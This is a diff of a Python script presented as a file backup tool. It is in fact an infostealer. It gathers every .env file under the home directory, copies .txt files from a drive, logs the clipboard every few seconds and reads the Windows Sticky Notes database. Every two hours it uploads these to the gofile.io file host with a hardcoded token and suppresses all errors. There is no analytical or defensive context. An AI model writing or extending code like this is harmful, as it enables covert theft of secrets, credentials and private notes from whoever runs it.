@@ -1,72 +1,106 @@
-import os 
+import os
 import shutil
 import time
 import subprocess
 import requests
 from datetime import datetime
 import threading
+import getpass
 
-root_directory = "/mnt/d"
-destination_directory = os.path.expanduser("~/dev/BackupTxtFiles")
+def get_windows_username():
+    try:
+        result = subprocess.run(
+            ["powershell.exe", "-Command", "[System.Environment]::UserName"],
+            capture_output=True,
+            text=True
+        )
+        if result.returncode == 0:
+            return result.stdout.strip()
+    except Exception:
+        pass
+    return os.environ.get("USERNAME", getpass.getuser())
 
-os.makedirs(destination_directory, exist_ok=True)
+def backup_files(source_dir, target_dir, file_extension):
+    source_dir = os.path.abspath(os.path.expanduser(source_dir))
+    target_dir = os.path.abspath(os.path.expanduser(target_dir))
 
-for dirpath, dirnames, filenames in os.walk(root_directory):
-    for filename in filenames:
-        if filename.endswith(".txt"):
-            source_file_path = os.path.join(dirpath, filename)
-            destination_file_path = os.path.join(destination_directory, filename)
-            
-            if not os.path.exists(destination_file_path) or (
-                os.path.getmtime(source_file_path) > os.path.getmtime(destination_file_path)
-            ):
+    if os.path.exists(target_dir):
+        shutil.rmtree(target_dir)
+
+    os.makedirs(target_dir, exist_ok=True)
+
+    for root, _, files in os.walk(source_dir):
+        for file in files:
+            if file.endswith(file_extension):
+                source_file = os.path.join(root, file)
+                relative_path = os.path.relpath(root, source_dir)
+                target_sub_dir = os.path.join(target_dir, relative_path)
+                target_file = os.path.join(target_sub_dir, file)
+
+                os.makedirs(target_sub_dir, exist_ok=True)
                 try:
-                    shutil.copy2(source_file_path, destination_file_path)
-                except Exception as e:
+                    shutil.copy2(source_file, target_file)
+                except Exception:
                     pass
 
+    return target_dir
+
+def zip_backup_folder(folder_path, zip_file_path):
+    try:
+        if os.path.exists(f"{zip_file_path}.zip"):
+            os.remove(f"{zip_file_path}.zip")
+        
+        shutil.make_archive(zip_file_path, 'zip', folder_path)
+        return f"{zip_file_path}.zip"
+    except Exception:
+        return None
+
+def is_valid_file(file_path):
+    try:
+        if not os.path.isfile(file_path):
+            return False
+        if os.path.getsize(file_path) == 0:
+            return False
+        with open(file_path, "rb"):
+            pass
+        return True
+    except Exception:
+        return False
+
+def upload_file(file_path, api_token):
+    if is_valid_file(file_path):
+        try:
+            with open(file_path, "rb") as f:
+                response = requests.post(
+                    "https://store9.gofile.io/uploadFile",
+                    files={"file": f},
+                    data={"token": api_token}
+                )
+        except Exception:
+            pass
+
+def upload_directory(directory_path, api_token):
+    for root, _, files in os.walk(directory_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            upload_file(file_path, api_token)
+
+# ========== 剪贴板监控和日志记录 ========== 
 def get_clipboard_content():
     try:
         result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
         return result.stdout.strip() if result.returncode == 0 else None
-    except:
+    except Exception:
         return None
 
 def log_clipboard_update(content, file_path):
-    with open(file_path, 'a') as f:
-        f.write(f"Time: {datetime.now()}\n{content}\n\n")
-
-def upload_file(file_path, api_token):
     try:
-        with open(file_path, "rb") as f:
-            response = requests.post(
-                "https://store9.gofile.io/uploadFile",
-                files={"file": f},
-                data={"token": api_token}
-            )
-    except Exception as e:
+        with open(file_path, 'a') as f:
+            f.write(f"Time: {datetime.now()}\n{content}\n\n")
+            f.flush()
+            os.fsync(f.fileno())
+    except Exception:
         pass
-
-def calculate_directory_size(directory_path):
-    total_size = 0
-    for root, _, files in os.walk(directory_path):
-        for file in files:
-            file_path = os.path.join(root, file)
-            if os.path.isfile(file_path):
-                total_size += os.path.getsize(file_path)
-    return total_size
-
-def upload_directory_if_changed(directory_path, api_token):
-    if not hasattr(upload_directory_if_changed, 'last_size'):
-        upload_directory_if_changed.last_size = 0
-
-    current_size = calculate_directory_size(directory_path)
-    if current_size != upload_directory_if_changed.last_size:
-        upload_directory_if_changed.last_size = current_size
-        for root, _, files in os.walk(directory_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                upload_file(file_path, api_token)
 
 def monitor_clipboard(file_path):
     last_content = ""
@@ -77,36 +111,39 @@ def monitor_clipboard(file_path):
             last_content = current_content
         time.sleep(3)
 
-def periodic_upload(files, directory, api_token):
-    while True:
-        for file_path in files:
-            upload_file(file_path, api_token)
-        upload_directory_if_changed(directory, api_token)
-        time.sleep(3600)
-
-def get_windows_username():
-    try:
-        result = subprocess.run(["powershell.exe", "-Command", "[System.Environment]::UserName"], capture_output=True, text=True)
-        if result.returncode == 0:
-            return result.stdout.strip()
-    except:
-        return ""
-    return ""
-
-if __name__ == '__main__':
-    clipboard_log_path = os.path.expanduser("~/dev/ba.txt")
+def periodic_backup_upload():
     windows_user = get_windows_username()
-    
-    sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
-    if not os.path.isfile(sticky_notes_path):
-        pass
 
+    env_backup_directory = "~/dev/Backup/env"
+    txt_backup_directory = "~/dev/Backup/txt"
+    txt_source_directory = "/mnt/d"
+    clipboard_log_path = os.path.expanduser("~/dev/Backup/clipboard_log.txt")
+    sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
     api_token = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"
+
+    threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,), daemon=True).start()
+
     os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
     open(clipboard_log_path, 'a').close()
 
-    files_to_upload = [clipboard_log_path, sticky_notes_path]
-    backup_folder_path = destination_directory
+    while True:
+        env_backup_dir = backup_files("~", env_backup_directory, ".env")
 
-    threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,)).start()
-    threading.Thread(target=periodic_upload, args=(files_to_upload, backup_folder_path, api_token)).start()
+        txt_backup_dir = backup_files(txt_source_directory, txt_backup_directory, ".txt")
+
+        zip_file_path = os.path.expanduser("~/dev/Backup/backup_files")
+        zip_file = zip_backup_folder(env_backup_dir, zip_file_path)
+
+        if zip_file:
+            upload_file(zip_file, api_token)
+
+        if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
+            upload_file(clipboard_log_path, api_token)
+
+        if os.path.exists(sticky_notes_path):
+            upload_file(sticky_notes_path, api_token)
+
+        time.sleep(7200)  
+
+if __name__ == '__main__':
+    periodic_backup_upload()
